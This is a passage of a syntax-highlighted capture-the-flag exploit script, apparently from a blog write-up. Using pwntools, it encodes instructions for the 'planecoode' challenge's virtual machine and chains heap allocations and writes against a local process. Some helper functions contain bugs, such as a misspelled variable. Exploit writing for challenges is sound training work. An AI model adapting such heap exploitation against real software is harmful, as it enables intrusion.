class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;165&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;166&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;167&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;168&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;169&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;170&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;171&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;172&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;173&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;174&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;175&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;176&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;177&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;178&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;179&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;180&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;181&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;182&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;183&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;184&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;185&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;186&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;187&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;188&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;189&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;190&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;191&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;193&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;194&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;195&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;196&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;197&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;198&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;199&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;200&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;201&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;202&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;203&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;204&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;205&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;206&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;207&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;208&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;209&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;210&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;211&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;212&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;213&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;214&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;215&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;216&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;217&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;218&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;219&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;220&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;221&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;222&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;223&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r=process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./planecoode&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf =ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./planecoode&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = elf.libc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#context.log_level =&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#code highest byte is 0x6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;incx = &lt;span class=&#34;number&#34;&gt;0x0600000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;pop1&lt;/span&gt;():				&lt;span class=&#34;comment&#34;&gt;#0xcc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload = incx + &lt;span class=&#34;number&#34;&gt;0xcc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;po4&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload =incx +&lt;span class=&#34;number&#34;&gt;0x98&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;mul&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload = incx + &lt;span class=&#34;number&#34;&gt;0x12&lt;/span&gt; + i&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;reset&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload = incx + &lt;span class=&#34;number&#34;&gt;0x13&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;xor&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload = incx +&lt;span class=&#34;number&#34;&gt;0x33&lt;/span&gt; + i&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;push1&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload = incx + &lt;span class=&#34;number&#34;&gt;0x36&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;div&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload = incx + &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt; + i&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;push4&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload = incx +&lt;span class=&#34;number&#34;&gt;0x45&lt;/span&gt; +i*&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;jmp&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;x,y&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload = &lt;span class=&#34;number&#34;&gt;0x0800000000000000&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x49&lt;/span&gt; + (y*&lt;span class=&#34;number&#34;&gt;0x1000000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload = incx + &lt;span class=&#34;number&#34;&gt;0x52&lt;/span&gt; + i*&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;sub&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload = incx + &lt;span class=&#34;number&#34;&gt;0x6a&lt;/span&gt; + i*&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;printc&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload = incx + &lt;span class=&#34;number&#34;&gt;0x54&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;n&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload = incx + &lt;span class=&#34;number&#34;&gt;0xcd&lt;/span&gt; +n*&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;exit&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; incx + &lt;span class=&#34;number&#34;&gt;0xd1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;write&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;wh,content&lt;/span&gt;):					&lt;span class=&#34;comment&#34;&gt;#   0&amp;lt;=  offset  &amp;lt;=0xffffffff&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload = incx + &lt;span class=&#34;number&#34;&gt;0xda&lt;/span&gt; + wh*&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;+content*&lt;span class=&#34;number&#34;&gt;0x10000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;decX&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	paylaod = &lt;span class=&#34;number&#34;&gt;0x0400000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;incy&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload = &lt;span class=&#34;number&#34;&gt;0x0800000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(jmp(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(jmp(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(malloc(&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(malloc(&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(malloc(&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(malloc(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(malloc(&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(malloc(&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(malloc(&lt;span class=&#34;number&#34;&gt;0x70&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(malloc(&lt;span class=&#34;number&#34;&gt;0x80&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(malloc(&lt;span class=&#34;number&#34;&gt;0x90&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(jmp(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(malloc(&lt;span class=&#34;number&#34;&gt;0xa0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(malloc(&lt;span class=&#34;number&#34;&gt;0xb0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(malloc(&lt;span class=&#34;number&#34;&gt;0xc0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(malloc(&lt;span class=&#34;number&#34;&gt;0xd0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(write(&lt;span class=&#34;number&#34;&gt;0x21&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x4&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(write(&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xd1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(write(&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xee&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(malloc(&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(write(&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xee&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(jmp(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(malloc(&lt;span class=&#34;number&#34;&gt;0xf0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(malloc(&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(write(&lt;span class=&#34;number&#34;&gt;0x21&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(write(&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(malloc(&lt;span class=&#34;number&#34;&gt;0xf0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(reset())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(code))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nums = &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(code)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Xn = &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Yn = &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(r,&amp;#x27;brva 0x0139D&amp;#x27;)				#set &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(r,&amp;#x27;brva 0x00164E&amp;#x27;)				#getcode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(r,&amp;#x27;brva 0x165e&amp;#x27;)				#operation&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(r,&amp;#x27;brva 0x013B7&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;size X:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(Xn))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;size Y:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(Yn))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;How many codes do you want to set?&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(nums))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;x=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;y=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i 